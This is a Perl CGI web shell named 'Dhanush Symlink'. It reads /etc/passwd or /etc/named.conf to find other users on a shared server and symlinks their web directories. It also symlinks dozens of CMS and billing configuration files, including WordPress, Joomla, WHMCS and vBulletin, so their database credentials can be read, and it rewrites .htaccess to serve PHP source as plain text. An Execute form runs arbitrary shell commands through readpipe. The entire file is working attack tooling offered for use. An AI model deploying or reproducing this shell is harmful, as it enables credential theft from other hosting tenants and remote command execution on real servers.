#!/usr/bin/perl -I/usr/local/bandmin

#========================================//
#=====+++Dhanush Symlink+++======//
#========================================//
#====+++Coded By Arjun+++===//
#========================================//
#=====+++An Indian Hacker+++=====//
#========================================//

local ($buffer, @pairs, $pair, $name, $value, %FORM);
    # Read in text
    $ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;
    if ($ENV{'REQUEST_METHOD'} eq "GET")
    {
	$buffer = $ENV{'QUERY_STRING'};
    }
    # Split information into name/value pairs
    @pairs = split(/&/, $buffer);
    foreach $pair (@pairs)
    {
	($name, $value) = split(/=/, $pair);
	$value =~ tr/+/ /;
	$value =~ s/%(..)/pack("C", hex($1))/eg;
	$FORM{$name} = $value;
    }
    $server = $FORM{server};
    $perl  = $FORM{perl};
	$config  = $FORM{config};
	$execute  = $FORM{execute};
	$execmd = $FORM{execmd};
	$exe  = $FORM{exe};
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<http-equiv="Content-Language" content="en-us" />
<http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Coded By Arjun</title>
<style type="text/css">
.newStyle1 {
background-color: #000000;
font-family: "Courier New", Courier, monospace;
font-weight: bold;
color: #FF0000;
}
.style1 {
text-align: center;
font-color: #FF0000;
}
.but
{background-color: #000000;color:#FF0000; border-color:#000000;}
.box
{background-color:#0C0C0C;color:#FF0000;width:27%; border-color:#000000;}
.tbox
{background-color:#0C0C0C;color:#FF0000;border-color:#000000;}
</style>
</head>
<body class="newStyle1">
<center><font size=4><pre>
//========================================//
//========+++&#2343;&#2344;&#2369;&#2359;+++==========//
//========================================//
//====+++&#2309;&#2352;&#2381;&#2332;&#2369;&#2344; &#2342;&#2381;&#2357;&#2352;&#2366; &#2344;&#2367;&#2352;&#2381;&#2350;&#2367;&#2340;+++===//
//========================================//
//=====+++&#2346;&#2352;&#2381;&#2354; &#2360;&#2367;&#2350;&#2354;&#2367;&#2325;&#2306; &#2313;&#2346;&#2350;&#2366;&#2352;&#2381;&#2327;+++=====//
//========================================//
</pre></font></font></center> 
<p class="style1"></p>
<table align=center><tr><td><form><input type=hidden name="server" value="Server Sym"><input type="submit" value="Server &#2360;&#2367;&#2350;&#2354;&#2367;&#2325;&#2306;" class=but></form></td>
<td><form><input type=hidden name="perl" value="Perl Sym"><input type="submit" value="Perl &#2360;&#2367;&#2350;&#2354;&#2367;&#2325;&#2306;" class=but></form></td>
<td><form><input type=hidden name="config" value="Get config"><input type="submit" value="config &#2342;&#2360;&#2381;&#2340;&#2366;&#2357;&#2375;&#2332; &#2354;&#2375;&#2306;" class=but></form></td></tr></table><br><br>
<center><form><input type=text name=execute class=box value='.$execute.'><input type=hidden name="execmd" value="Execute"> <input type=submit name=exe value="Execute" class=but></form></center>';

sub getsym
{
			symlink('/home/'.$_[0].'/public_html/vb/includes/config.php',$_[1].'~~vBulletin1.txt');
			symlink('/home/'.$_[0].'/public_html/core/includes/config.php',$_[1].'~~vBulletin5.txt');
			symlink('/home/'.$_[0].'/public_html/includes/config.php',$_[1].'~~vBulletin2.txt');
			symlink('/home/'.$_[0].'/public_html/forum/includes/config.php',$_[1].'~~vBulletin3.txt');
			symlink('/home/'.$_[0].'/public_html/vb/core/includes/config.php',$_[1].'~~vBulletin5.txt');
			symlink('/home/'.$_[0].'/public_html/inc/config.php',$_[1].'~~mybb.txt');
			symlink('/home/'.$_[0].'/public_html/config.php',$_[1].'~~Phpbb1.txt');
			symlink('/home/'.$_[0].'/public_html/forum/includes/config.php',$_[1].'~~Phpbb2.txt');
			symlink('/home/'.$_[0].'/public_html/conf_global.php',$_[1].'~~ipb1.txt');
			symlink('/home/'.$_[0].'/public_html/wp-config.php',$_[1].'~~Wordpress1.txt');
			symlink('/home/'.$_[0].'/public_html/blog/wp-config.php',$_[1].'~~Wordpress2.txt');
			symlink('/home/'.$_[0].'/public_html/configuration.php',$_[1].'~~Joomla1.txt');
			symlink('/home/'.$_[0].'/public_html/blog/configuration.php',$_[1].'~~Joomla2.txt');
			symlink('/home/'.$_[0].'/public_html/joomla/configuration.php',$_[1].'~~Joomla3.txt');
			symlink('/home/'.$_[0].'/public_html/bb-config.php',$_[1].'~~boxbilling.txt');
			symlink('/home/'.$_[0].'/public_html/billing/bb-config.php',$_[1].'~~boxbilling.txt');
			symlink('/home/'.$_[0].'/public_html/whm/configuration.php',$_[1].'~~Whm1.txt');
			symlink('/home/'.$_[0].'/public_html/whmc/configuration.php',$_[1].'~~Whm2.txt');
			symlink('/home/'.$_[0].'/public_html/support/configuration.php',$_[1].'~~Whm3.txt');
			symlink('/home/'.$_[0].'/public_html/client/configuration.php',$_[1].'~~Whm4.txt');
			symlink('/home/'.$_[0].'/public_html/billings/configuration.php',$_[1].'~~Whm5.txt');
			symlink('/home/'.$_[0].'/public_html/billing/configuration.php',$_[1].'~~Whm6.txt');
			symlink('/home/'.$_[0].'/public_html/clients/configuration.php',$_[1].'~~Whm7.txt');
			symlink('/home/'.$_[0].'/public_html/whmcs/configuration.php',$_[1].'~~Whm8.txt');
			symlink('/home/'.$_[0].'/public_html/order/configuration.php',$_[1].'~~Whm9.txt');
			symlink('/home/'.$_[0].'/public_html/admin/conf.php',$_[1].'~~5.txt');
			symlink('/home/'.$_[0].'/public_html/admin/config.php',$_[1].'~~4.txt');
			symlink('/home/'.$_[0].'/public_html/conf_global.php',$_[1].'~~invisio.txt');
			symlink('/home/'.$_[0].'/public_html/include/db.php',$_[1].'~~7.txt');
			symlink('/home/'.$_[0].'/public_html/connect.php',$_[1].'~~8.txt');
			symlink('/home/'.$_[0].'/public_html/mk_conf.php',$_[1].'~~mk-portale1.txt');
			symlink('/home/'.$_[0].'/public_html/include/config.php',$_[1].'~~12.txt');
			symlink('/home/'.$_[0].'/public_html/settings.php',$_[1].'~~Smf.txt');
			symlink('/home/'.$_[0].'/public_html/includes/functions.php',$_[1].'~~phpbb3.txt');
			symlink('/home/'.$_[0].'/public_html/include/db.php',$_[1].'~~infinity.txt');
}
sub chdr
{
	chdir $_[0];
	open(DATA, ">.htaccess");
	print DATA "Options all\nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
}
if($server eq "Server Sym")
{
	mkdir "arj", 0755;
	&chdr("arj");
	chdir "arj";
	open (d0mains, '/etc/named.conf') or $err=1;
	@kr = <d0mains>;
	close d0mains;
	if ($err)
	{
		open INPUT, "</etc/passwd";
		while ( <INPUT> )
		{
			$line=$_; @sprt=split(/:/,$line); $user=$sprt[0];
			system('ln -s /home/'.$user.'/public_html ' . $user);
		}
		print '<center>&#2325;&#2366;&#2352;&#2381;&#2351; &#2346;&#2370;&#2352;&#2366; &#2361;&#2369;&#2310; <a href=arj>&#2351;&#2361;&#2366;&#2305; &#2332;&#2366;&#2351;&#2375;&#2306;</a></center>';
	}
	else
	{
		foreach my $one (@kr)
		{
			if($one =~ m/.*?zone "(.*?)" {/)
			{
				$filename= "/etc/valiases/".$1;
				$owner = getpwuid((stat($filename))[4]);
				system('ln -s /home/'.$owner.'/public_html ' . $1);
			}
		}
		print '<center>&#2325;&#2366;&#2352;&#2381;&#2351; &#2346;&#2370;&#2352;&#2366; &#2361;&#2369;&#2310; <a href=arj>&#2351;&#2361;&#2366;&#2305; &#2332;&#2366;&#2351;&#2375;&#2306;</a></center>';
	}
}
elsif($perl eq "Perl Sym")
{
	mkdir "arj", 0755;
	&chdr("arj");
	chdir "arj";
	open (d0mains, '/etc/named.conf') or $err=1;
	@kr = <d0mains>;
	close d0mains;
	if ($err)
	{
		open INPUT, "</etc/passwd";
		while ( <INPUT> )
		{
			$line=$_; @sprt=split(/:/,$line); $user=$sprt[0];
			symlink('/home/'.$user.'/public_html', $user);
		}
		print '<center>&#2325;&#2366;&#2352;&#2381;&#2351; &#2346;&#2370;&#2352;&#2366; &#2361;&#2369;&#2310; <a href=arj>&#2351;&#2361;&#2366;&#2305; &#2332;&#2366;&#2351;&#2375;&#2306;</a></center>';
	}
	else
	{
		foreach my $one (@kr)
		{
			if($one =~ m/.*?zone "(.*?)" {/)
			{
				$filename= "/etc/valiases/".$1;
				$owner = getpwuid((stat($filename))[4]);
				symlink('/home/'.$owner.'/public_html', $1);
			}
		}
		print '<center>&#2325;&#2366;&#2352;&#2381;&#2351; &#2346;&#2370;&#2352;&#2366; &#2361;&#2369;&#2310; <a href=arj>&#2351;&#2361;&#2366;&#2305; &#2332;&#2366;&#2351;&#2375;&#2306;</a></center>';
	}
}
elsif($config eq "Get config")
{
	mkdir "arj1", 0755;
	&chdr("arj1");
	chdir "arj1";
	open (d0mains, '/etc/named.conf') or $err=1;
	@kr = <d0mains>;
	close d0mains;
	if ($err)
	{
		open INPUT, "</etc/passwd";
		while ( <INPUT> )
		{
			$line=$_; @sprt=split(/:/,$line); $user=$sprt[0];
			$user1 = $user;
			&getsym($user,$user1);
		}
		print '<center>&#2325;&#2366;&#2352;&#2381;&#2351; &#2346;&#2370;&#2352;&#2366; &#2361;&#2369;&#2310; <a href=arj1>&#2351;&#2361;&#2366;&#2305; &#2332;&#2366;&#2351;&#2375;&#2306;</a></center>';
	}
	else
	{
		foreach my $one (@kr)
		{
			if($one =~ m/.*?zone "(.*?)" {/)
			{
				$filename= "/etc/valiases/".$1;
				$owner = getpwuid((stat($filename))[4]);
				&getsym($owner,$1);
			}
		}
		print '<center>&#2325;&#2366;&#2352;&#2381;&#2351; &#2346;&#2370;&#2352;&#2366; &#2361;&#2369;&#2310; <a href=arj1>&#2351;&#2361;&#2366;&#2305; &#2332;&#2366;&#2351;&#2375;&#2306;</a></center>';
	}
}
elsif($execmd eq "Execute")
{
	print '<br><br><center><textarea cols="95" rows="19" class=tbox>'.readpipe($execute).'</textarea></center>';
}
print '</body></html>';